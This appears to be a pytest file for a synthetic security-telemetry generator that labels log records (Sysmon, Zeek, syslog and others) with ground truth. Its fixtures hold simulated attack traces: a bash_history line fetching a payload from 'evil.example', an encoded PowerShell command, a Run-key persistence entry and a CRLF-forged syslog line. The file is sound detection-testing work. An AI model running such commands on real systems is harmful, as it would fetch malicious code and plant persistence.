# Copyright (c) 2026 Cisco Systems, Inc. and its affiliates
# SPDX-License-Identifier: MIT

"""Tests for physical-record provenance and sidecar generation."""

import json
from datetime import UTC, datetime

import pytest

from evidenceforge.events.base import SecurityEvent
from evidenceforge.events.record_ground_truth import (
    RECORD_GROUND_TRUTH_FILENAME,
    RecordGroundTruthRecorder,
    _record_exposes_primary_semantics,
    activate_record_provenance,
)
from evidenceforge.generation.emitters.host_base import _SingleHostWriter
from evidenceforge.generation.emitters.zeek_base import _SingleZeekWriter


def _read_jsonl(path):
    return [json.loads(line) for line in path.read_text(encoding="utf-8").splitlines()]


def test_registry_read_is_direct_only_in_native_ecar_source() -> None:
    """Registry reads must not claim nonexistent Sysmon write-style evidence."""
    assert _record_exposes_primary_semantics("ecar", ("registry_read",), {}) is True
    assert (
        _record_exposes_primary_semantics("windows_event_sysmon", ("registry_read",), {}) is False
    )
    assert (
        _record_exposes_primary_semantics("windows_event_security", ("registry_read",), {}) is False
    )


def test_host_writer_records_exact_sysmon_native_id_and_storyline_label(tmp_path) -> None:
    recorder = RecordGroundTruthRecorder(tmp_path, "ds-test")
    event = SecurityEvent(
        timestamp=datetime(2026, 7, 11, 10, 0, tzinfo=UTC),
        event_type="process_create",
        storyline_cluster_id="step-001",
    )
    provenance = recorder.provenance_for_event(event)
    output_path = tmp_path / "WS-01.example" / "windows_event_sysmon.xml"
    writer = _SingleHostWriter(
        output_path,
        record_ground_truth=recorder,
        source_format="windows_event_sysmon",
    )
    writer.write_header("<Events>")
    rendered = (
        "<Event><System><EventID>1</EventID><TimeCreated "
        'SystemTime="2026-07-11T10:00:00.0000000Z"/>'
        "<EventRecordID>740001</EventRecordID>"
        "<Computer>WS-01.example</Computer></System></Event>"
    )

    with activate_record_provenance(provenance):
        writer.write(rendered)
    writer.flush()
    recorder.write_jsonl(tmp_path / RECORD_GROUND_TRUTH_FILENAME)

    records = _read_jsonl(tmp_path / RECORD_GROUND_TRUTH_FILENAME)
    assert len(records) == 1
    assert records[0]["label"] == "malicious"
    assert records[0]["storyline_id"] == "step-001"
    assert records[0]["event_type"] == "process_create"
    assert records[0]["source_format"] == "windows_event_sysmon"
    assert records[0]["source_instance"] == "WS-01.example"
    assert records[0]["record_index"] == 0
    assert records[0]["byte_offset"] == len(b"<Events>\n")
    assert records[0]["native_record_id"] == {
        "computer": "WS-01.example",
        "event_id": 1,
        "event_record_id": 740001,
    }
    assert records[0]["attribution_status"] == "exact"
    assert records[0]["mapping_method"] == "generation_provenance"
    assert records[0]["correlation_features"] == {
        "computer": "WS-01.example",
        "event_id": 1,
        "event_record_id": 740001,
    }
    assert records[0]["physical_record_id"].startswith("pr-")
    assert records[0]["logical_event_id"].startswith("le-")
    assert "evidenceforge" not in output_path.read_text(encoding="utf-8").lower()


def test_zeek_receipts_follow_final_sorted_file_order_and_keep_labels(tmp_path) -> None:
    recorder = RecordGroundTruthRecorder(tmp_path, "ds-zeek")
    malicious = SecurityEvent(
        timestamp=datetime(2026, 7, 11, 10, 0, 2, tzinfo=UTC),
        event_type="connection",
        storyline_cluster_id="step-002",
    )
    benign = SecurityEvent(
        timestamp=datetime(2026, 7, 11, 10, 0, 1, tzinfo=UTC),
        event_type="connection",
    )
    writer = _SingleZeekWriter(
        tmp_path / "zeek-core" / "conn.json",
        buffer_size=1,
        sort_before_flush=True,
        sort_key=lambda line: json.loads(line)["ts"],
        record_ground_truth=recorder,
        source_format="zeek_conn",
    )

    with activate_record_provenance(recorder.provenance_for_event(malicious)):
        writer.write('{"ts":2.0,"uid":"C-malicious"}')
    with activate_record_provenance(recorder.provenance_for_event(benign)):
        writer.write('{"ts":1.0,"uid":"C-benign"}')
    writer.close()
    recorder.write_jsonl(tmp_path / RECORD_GROUND_TRUTH_FILENAME)

    records = _read_jsonl(tmp_path / RECORD_GROUND_TRUTH_FILENAME)
    assert [record["native_record_id"]["uid"] for record in records] == [
        "C-benign",
        "C-malicious",
    ]
    assert [record["record_index"] for record in records] == [0, 1]
    assert [record["label"] for record in records] == ["benign", "malicious"]
    assert [record["byte_offset"] for record in records] == [
        0,
        len(b'{"ts":1.0,"uid":"C-benign"}\n'),
    ]


def test_zeek_duplicate_records_preserve_emission_order_provenance(tmp_path) -> None:
    recorder = RecordGroundTruthRecorder(tmp_path, "ds-zeek-duplicates")
    first = SecurityEvent(
        timestamp=datetime(2026, 7, 11, 10, 0, tzinfo=UTC),
        event_type="connection",
        storyline_cluster_id="step-first",
    )
    second = SecurityEvent(
        timestamp=datetime(2026, 7, 11, 10, 0, tzinfo=UTC),
        event_type="connection",
        storyline_cluster_id="step-second",
    )
    writer = _SingleZeekWriter(
        tmp_path / "sensor" / "conn.json",
        buffer_size=1,
        sort_before_flush=True,
        sort_key=lambda line: json.loads(line)["ts"],
        record_ground_truth=recorder,
        source_format="zeek_conn",
    )
    rendered = '{"ts":1.0,"uid":"C-identical"}'
    with activate_record_provenance(recorder.provenance_for_event(first)):
        writer.write(rendered)
    with activate_record_provenance(recorder.provenance_for_event(second)):
        writer.write(rendered)
    writer.close()
    recorder.write_jsonl(tmp_path / RECORD_GROUND_TRUTH_FILENAME)

    records = _read_jsonl(tmp_path / RECORD_GROUND_TRUTH_FILENAME)
    assert [record["storyline_id"] for record in records] == ["step-first", "step-second"]


def test_red_herring_and_unattributed_records_are_not_marked_malicious(tmp_path) -> None:
    recorder = RecordGroundTruthRecorder(tmp_path, "ds-labels")
    red_herring = SecurityEvent(
        timestamp=datetime(2026, 7, 11, 10, 0, tzinfo=UTC),
        event_type="process_create",
        storyline_cluster_id="red_herring:rh-001",
    )

    red = recorder.provenance_for_event(red_herring)
    assert red.label == "red_herring"
    assert red.provenance_kind == "red_herring"

    recorder.record_written(
        output_path=tmp_path / "host" / "syslog.log",
        source_format="syslog",
        rendered="Jul 11 10:00:00 host app: background",
    )
    recorder.write_jsonl(tmp_path / RECORD_GROUND_TRUTH_FILENAME)
    record = _read_jsonl(tmp_path / RECORD_GROUND_TRUTH_FILENAME)[0]
    assert record["label"] == "benign"
    assert record["provenance_kind"] == "unattributed"


def test_line_oriented_writer_labels_each_crlf_forged_physical_record(tmp_path) -> None:
    recorder = RecordGroundTruthRecorder(tmp_path, "ds-crlf")
    event = SecurityEvent(
        timestamp=datetime(2026, 7, 11, 10, 0, tzinfo=UTC),
        event_type="adversarial_payload",
        storyline_cluster_id="step-crlf",
    )
    writer = _SingleHostWriter(
        tmp_path / "linux-01" / "syslog.log",
        record_ground_truth=recorder,
        source_format="syslog",
    )

    with activate_record_provenance(recorder.provenance_for_event(event)):
        writer.write(
            "<14>1 2026-07-11T10:00:00Z linux-01 app - - - original\r\n"
            "<11>1 2026-07-11T10:00:00Z linux-01 sshd - - - forged"
        )
    writer.flush()
    recorder.write_jsonl(tmp_path / RECORD_GROUND_TRUTH_FILENAME)

    records = _read_jsonl(tmp_path / RECORD_GROUND_TRUTH_FILENAME)
    assert len(records) == 2
    assert [record["record_index"] for record in records] == [0, 1]
    assert all(record["label"] == "malicious" for record in records)
    assert len({record["physical_record_id"] for record in records}) == 2


@pytest.mark.parametrize(
    ("source_format", "rendered", "expected"),
    [
        (
            "windows_event_sysmon",
            '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
            '<System><Provider Name="Microsoft-Windows-Sysmon"/><EventID>1</EventID>'
            "<Channel>Microsoft-Windows-Sysmon/Operational</Channel>"
            "<Computer>WS-01.example</Computer></System><EventData>"
            '<Data Name="ProcessGuid">{PROC-GUID}</Data><Data Name="ProcessId">4242</Data>'
            '<Data Name="ParentProcessGuid">{PARENT-GUID}</Data>'
            '<Data Name="ParentProcessId">100</Data>'
            '<Data Name="Image">C:\\Windows\\powershell.exe</Data>'
            '<Data Name="CommandLine">powershell -enc AAA</Data>'
            '<Data Name="ImageLoaded">C:\\ProgramData\\payload.dll</Data>'
            '<Data Name="Signed">false</Data>'
            '<Data Name="SignatureStatus">Unavailable</Data>'
            '<Data Name="TargetObject">HKU\\S-1-5-21\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater</Data>'
            '<Data Name="Details">C:\\ProgramData\\update.bin</Data>'
            "</EventData></Event>",
            {
                "computer": "WS-01.example",
                "event_id": 1,
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "provider": "Microsoft-Windows-Sysmon",
                "event_data": {
                    "ProcessGuid": "{PROC-GUID}",
                    "ProcessId": 4242,
                    "ParentProcessGuid": "{PARENT-GUID}",
                    "ParentProcessId": 100,
                    "Image": "C:\\Windows\\powershell.exe",
                    "CommandLine": "powershell -enc AAA",
                    "ImageLoaded": "C:\\ProgramData\\payload.dll",
                    "Signed": "false",
                    "SignatureStatus": "Unavailable",
                    "TargetObject": (
                        "HKU\\S-1-5-21\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater"
                    ),
                    "Details": "C:\\ProgramData\\update.bin",
                },
            },
        ),
        (
            "zeek_dns",
            '{"ts":1.0,"uid":"C1","id.orig_h":"10.0.0.1","id.orig_p":53000,'
            '"id.resp_h":"10.0.0.53","id.resp_p":53,"proto":"udp",'
            '"trans_id":7,"query":"evil.example","qtype_name":"A",'
            '"rcode_name":"NOERROR","answers":["203.0.113.8"]}',
            {
                "uid": "C1",
                "id.orig_h": "10.0.0.1",
                "id.orig_p": 53000,
                "id.resp_h": "10.0.0.53",
                "id.resp_p": 53,
                "proto": "udp",
                "trans_id": 7,
                "query": "evil.example",
                "qtype_name": "A",
                "rcode_name": "NOERROR",
                "answers": ["203.0.113.8"],
            },
        ),
        (
            "ecar",
            '{"timestamp_ms":1000,"id":"E1","objectID":"P1","actorID":"A1",'
            '"hostname":"linux-01","object":"PROCESS","action":"CREATE",'
            '"pid":4242,"ppid":100,"principal":"alice",'
            '"properties":{"image_path":"/usr/bin/curl","command_line":"curl x",'
            '"src_ip":"10.0.0.1","dst_ip":"203.0.113.8","dst_port":443}}',
            {
                "hostname": "linux-01",
                "object": "PROCESS",
                "action": "CREATE",
                "actorID": "A1",
                "principal": "alice",
                "pid": 4242,
                "ppid": 100,
                "id": "E1",
                "objectID": "P1",
                "properties": {
                    "src_ip": "10.0.0.1",
                    "dst_ip": "203.0.113.8",
                    "dst_port": 443,
                    "image_path": "/usr/bin/curl",
                    "command_line": "curl x",
                },
            },
        ),
        (
            "syslog",
            "<34>1 2026-07-11T10:00:00Z linux-01 sshd 4242 AUTH - Accepted publickey",
            {
                "pri": 34,
                "timestamp": "2026-07-11T10:00:00Z",
                "hostname": "linux-01",
                "app_name": "sshd",
                "procid": 4242,
                "msgid": "AUTH",
            },
        ),
        (
            "web_access",
            '203.0.113.10 - alice [11/Jul/2026:10:00:00 +0000] "POST /upload HTTP/1.1" '
            '201 1234 "-" "curl/8.0"',
            {
                "client_ip": "203.0.113.10",
                "username": "alice",
                "timestamp": "11/Jul/2026:10:00:00 +0000",
                "method": "POST",
                "target": "/upload",
                "protocol": "HTTP/1.1",
                "status_code": 201,
                "bytes_sent": 1234,
            },
        ),
        (
            "cisco_asa",
            "<166>Jul 11 10:00:00 fw01 %ASA-6-302013: Built outbound TCP connection "
            "123456 for inside:10.0.0.1/50000 (198.51.100.1/60000) to "
            "outside:203.0.113.8/443 (203.0.113.8/443)",
            {
                "pri": 166,
                "timestamp": "Jul 11 10:00:00",
                "hostname": "fw01",
                "severity": 6,
                "msg_id": 302013,
                "connection_id": 123456,
                "src_ip": "10.0.0.1",
                "src_port": 50000,
                "dst_ip": "203.0.113.8",
                "dst_port": 443,
            },
        ),
        (
            "snort_alert",
            "07/11-10:00:00.123 [**] [1:2100365:1] Test [**] "
            "[Classification: Test] [Priority: 1] {TCP} 10.0.0.1:50000 -> 203.0.113.8:443",
            {
                "timestamp": "07/11-10:00:00.123",
                "gid": 1,
                "sid": 2100365,
                "rev": 1,
                "protocol": "TCP",
                "src_ip": "10.0.0.1",
                "src_port": 50000,
                "dst_ip": "203.0.113.8",
                "dst_port": 443,
            },
        ),
        (
            "bash_history",
            "#1783764000\ncurl https://evil.example/payload",
            {
                "history_timestamp": 1783764000,
                "command": "curl https://evil.example/payload",
                "hostname": "source",
            },
        ),
    ],
)
def test_sidecar_extracts_cross_source_correlation_features(
    tmp_path,
    source_format: str,
    rendered: str,
    expected: dict[str, object],
) -> None:
    recorder = RecordGroundTruthRecorder(tmp_path, "ds-features")
    record = recorder.record_written(
        output_path=tmp_path / "source" / "events.log",
        source_format=source_format,
        rendered=rendered,
    )
    assert record["correlation_features"] == expected


def test_security_sidecar_uses_event_id_specific_public_fields(tmp_path) -> None:
    recorder = RecordGroundTruthRecorder(tmp_path, "ds-security-fields")
    common = (
        '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
        '<System><Provider Name="Microsoft-Windows-Security-Auditing"/>'
        "<Channel>Security</Channel><Computer>WS-01.example</Computer>"
    )
    rendered_by_event = {
        4688: (
            common + "<EventID>4688</EventID></System><EventData>"
            '<Data Name="NewProcessId">0x200</Data>'
            '<Data Name="ProcessId">0x100</Data>'
            '<Data Name="NewProcessName">C:\\Windows\\System32\\rundll32.exe</Data>'
            '<Data Name="ParentProcessName">C:\\Program Files\\Microsoft Office\\WINWORD.EXE</Data>'
            '<Data Name="CommandLine">rundll32.exe C:\\Users\\alice\\AppData\\Local\\Temp\\x.dll,X</Data>'
            '<Data Name="TaskName">must-not-cross-event-map</Data>'
            "</EventData></Event>"
        ),
        4698: (
            common + "<EventID>4698</EventID></System><EventData>"
            '<Data Name="TaskName">\\Updater</Data>'
            '<Data Name="TaskContent">&lt;Task&gt;&lt;Command&gt;C:\\Users\\alice\\AppData\\Local\\x.exe&lt;/Command&gt;&lt;/Task&gt;</Data>'
            '<Data Name="NewProcessId">must-not-cross-event-map</Data>'
            "</EventData></Event>"
        ),
        5156: (
            common + "<EventID>5156</EventID></System><EventData>"
            '<Data Name="ProcessID">512</Data>'
            '<Data Name="Application">C:\\Users\\alice\\AppData\\Local\\x.exe</Data>'
            '<Data Name="Direction">%%14593</Data>'
            '<Data Name="SourceAddress">10.0.0.5</Data>'
            '<Data Name="SourcePort">55000</Data>'
            '<Data Name="DestAddress">198.51.100.8</Data>'
            '<Data Name="DestPort">443</Data>'
            '<Data Name="Protocol">6</Data>'
            '<Data Name="TaskContent">must-not-cross-event-map</Data>'
            "</EventData></Event>"
        ),
    }

    records = {
        event_id: recorder.record_written(
            output_path=tmp_path / "WS-01.example" / f"security-{event_id}.xml",
            source_format="windows_event_security",
            rendered=rendered,
        )["correlation_features"]["event_data"]
        for event_id, rendered in rendered_by_event.items()
    }

    assert records[4688] == {
        "NewProcessId": "0x200",
        "ProcessId": "0x100",
        "NewProcessName": "C:\\Windows\\System32\\rundll32.exe",
        "ParentProcessName": "C:\\Program Files\\Microsoft Office\\WINWORD.EXE",
        "CommandLine": "rundll32.exe C:\\Users\\alice\\AppData\\Local\\Temp\\x.dll,X",
    }
    assert records[4698] == {
        "TaskName": "\\Updater",
        "TaskContent": ("<Task><Command>C:\\Users\\alice\\AppData\\Local\\x.exe</Command></Task>"),
    }
    assert records[5156] == {
        "ProcessID": 512,
        "Application": "C:\\Users\\alice\\AppData\\Local\\x.exe",
        "Direction": "%%14593",
        "SourceAddress": "10.0.0.5",
        "SourcePort": 55000,
        "DestAddress": "198.51.100.8",
        "DestPort": 443,
        "Protocol": 6,
    }


def test_refresh_path_preserves_provenance_and_rebuilds_final_hash(tmp_path) -> None:
    recorder = RecordGroundTruthRecorder(tmp_path, "ds-refresh")
    event = SecurityEvent(
        timestamp=datetime(2026, 7, 11, 10, 0, tzinfo=UTC),
        event_type="connection",
        storyline_cluster_id="step-asa",
    )
    path = tmp_path / "fw01" / "cisco_asa.log"
    path.parent.mkdir(parents=True)
    original = (
        "<166>Jul 11 10:00:00 fw01 %ASA-6-302013: Built outbound TCP connection "
        "100 for inside:10.0.0.1/50000 (10.0.0.1/50000) to "
        "outside:203.0.113.8/443 (203.0.113.8/443)"
    )
    path.write_text(original + "\n", encoding="utf-8")
    recorder.record_written(
        output_path=path,
        source_format="cisco_asa",
        rendered=original,
        provenance=recorder.provenance_for_event(event),
        byte_offset=0,
    )

    final = original.replace("connection 100", "connection 900001")
    path.write_text(final + "\n", encoding="utf-8")
    recorder.refresh_path(path, "cisco_asa")
    recorder.validate_final_records()
    recorder.write_jsonl(tmp_path / RECORD_GROUND_TRUTH_FILENAME)

    record = _read_jsonl(tmp_path / RECORD_GROUND_TRUTH_FILENAME)[0]
    assert record["storyline_id"] == "step-asa"
    assert record["native_record_id"]["connection_id"] == 900001


def test_windows_snare_sidecar_extracts_native_and_correlation_fields(tmp_path) -> None:
    rendered = (
        "<134>Jul 11 10:00:00 WS-01 WS-01\tMSWinEventLog\t1\t"
        "Microsoft-Windows-Sysmon/Operational\t740001\tFri Jul 11 10:00:00 2026\t"
        "1\tMicrosoft-Windows-Sysmon\talice\tN/A\tInformation\tWS-01\t"
        "Process Create\tProcess Create:  ProcessGuid: {PROC}  ProcessId: 4242  "
        "Image: C:\\Windows\\powershell.exe  CommandLine: powershell -enc AAA  "
    )
    recorder = RecordGroundTruthRecorder(tmp_path, "ds-snare")
    record = recorder.record_written(
        output_path=tmp_path / "WS-01" / "2026" / "windows_event_sysmon_snare.log",
        source_format="windows_event_sysmon",
        rendered=rendered,
    )
    assert record["native_record_id"] == {
        "computer": "WS-01",
        "event_id": 1,
        "event_record_id": 740001,
    }
    assert record["observed_time"] == "Fri Jul 11 10:00:00 2026"
    assert record["correlation_features"]["event_data"] == {
        "ProcessGuid": "{PROC}",
        "ProcessId": 4242,
        "Image": "C:\\Windows\\powershell.exe",
        "CommandLine": "powershell -enc AAA",
    }


def test_integrity_validation_rejects_post_receipt_mutation(tmp_path) -> None:
    recorder = RecordGroundTruthRecorder(tmp_path, "ds-integrity")
    path = tmp_path / "host" / "syslog.log"
    path.parent.mkdir(parents=True)
    path.write_text("original\n", encoding="utf-8")
    recorder.record_written(
        output_path=path,
        source_format="syslog",
        rendered="original",
        provenance=recorder.provenance_for_raw("syslog"),
        byte_offset=0,
    )
    recorder.validate_final_records()

    path.write_text("modified\n", encoding="utf-8")
    with pytest.raises(ValueError, match="content mismatch"):
        recorder.validate_final_records()


def test_aggregated_record_exposes_all_contributing_logical_events(tmp_path) -> None:
    recorder = RecordGroundTruthRecorder(tmp_path, "ds-aggregate")
    first = SecurityEvent(
        timestamp=datetime(2026, 7, 11, 10, 0, tzinfo=UTC),
        event_type="connection",
        storyline_cluster_id="step-1",
    )
    second = SecurityEvent(
        timestamp=datetime(2026, 7, 11, 10, 0, tzinfo=UTC),
        event_type="file_create",
        storyline_cluster_id="step-2",
    )
    provenances = [
        recorder.provenance_for_event(first),
        recorder.provenance_for_event(second),
    ]
    record = recorder.record_written(
        output_path=tmp_path / "aggregate.json",
        source_format="ecar",
        rendered='{"id":"aggregate"}',
        provenance=provenances,
    )
    assert record["contributing_logical_event_ids"] == [
        first.logical_event_id,
        second.logical_event_id,
    ]
    assert record["contributing_storyline_ids"] == ["step-1", "step-2"]


def test_detectability_class_separates_direct_associated_and_provenance_only(tmp_path) -> None:
    recorder = RecordGroundTruthRecorder(tmp_path, "ds-detectability")
    process = SecurityEvent(
        timestamp=datetime(2026, 7, 11, 10, 0, tzinfo=UTC),
        event_type="process_create",
        storyline_cluster_id="step-process",
    )
    connection = SecurityEvent(
        timestamp=datetime(2026, 7, 11, 10, 1, tzinfo=UTC),
        event_type="connection",
        storyline_cluster_id="step-network",
    )
    opaque = SecurityEvent(
        timestamp=datetime(2026, 7, 11, 10, 2, tzinfo=UTC),
        event_type="adversarial_payload",
        storyline_cluster_id="step-opaque",
    )

    direct = recorder.record_written(
        output_path=tmp_path / "host" / "ecar.json",
        source_format="ecar",
        rendered=(
            '{"timestamp_ms":1000,"hostname":"host","object":"PROCESS",'
            '"action":"CREATE","objectID":"proc-1","pid":4242,'
            '"properties":{"image_path":"C:\\\\Temp\\\\tool.exe",'
            '"command_line":"C:\\\\Temp\\\\tool.exe -x"}}'
        ),
        provenance=recorder.provenance_for_event(process),
    )
    associated = recorder.record_written(
        output_path=tmp_path / "sensor" / "conn.json",
        source_format="zeek_conn",
        rendered=(
            '{"ts":2.0,"uid":"C-association","id.orig_h":"10.0.0.5",'
            '"id.orig_p":50000,"id.resp_h":"203.0.113.8",'
            '"id.resp_p":443,"proto":"tcp"}'
        ),
        provenance=recorder.provenance_for_event(connection),
    )
    provenance_only = recorder.record_written(
        output_path=tmp_path / "host" / "opaque.log",
        source_format="unknown_source",
        rendered="opaque source-native payload",
        provenance=recorder.provenance_for_event(opaque),
    )

    assert direct["schema_version"] == 3
    assert direct["detectability_class"] == "direct"
    assert "ecar_process_object_id" in direct["required_anchor_types"]
    assert associated["detectability_class"] == "association_required"
    assert "zeek_uid" in associated["required_anchor_types"]
    assert provenance_only["detectability_class"] == "provenance_only"
    assert provenance_only["required_anchor_types"] == []


def test_detectability_override_is_validated_and_stays_out_of_source_record(tmp_path) -> None:
    recorder = RecordGroundTruthRecorder(tmp_path, "ds-detectability-override")
    event = SecurityEvent(
        timestamp=datetime(2026, 7, 11, 10, 0, tzinfo=UTC),
        event_type="connection",
        storyline_cluster_id="step-override",
        ground_truth_detectability_class="direct",
    )
    rendered = '{"ts":1.0,"uid":"C1"}'
    record = recorder.record_written(
        output_path=tmp_path / "sensor" / "conn.json",
        source_format="zeek_conn",
        rendered=rendered,
        provenance=recorder.provenance_for_event(event),
    )
    assert record["detectability_class"] == "direct"
    assert "detectability" not in rendered

    invalid = SecurityEvent(
        timestamp=datetime(2026, 7, 11, 10, 1, tzinfo=UTC),
        event_type="connection",
        storyline_cluster_id="step-invalid",
        ground_truth_detectability_class="guessable",
    )
    with pytest.raises(ValueError, match="ground_truth_detectability_class"):
        recorder.provenance_for_event(invalid)
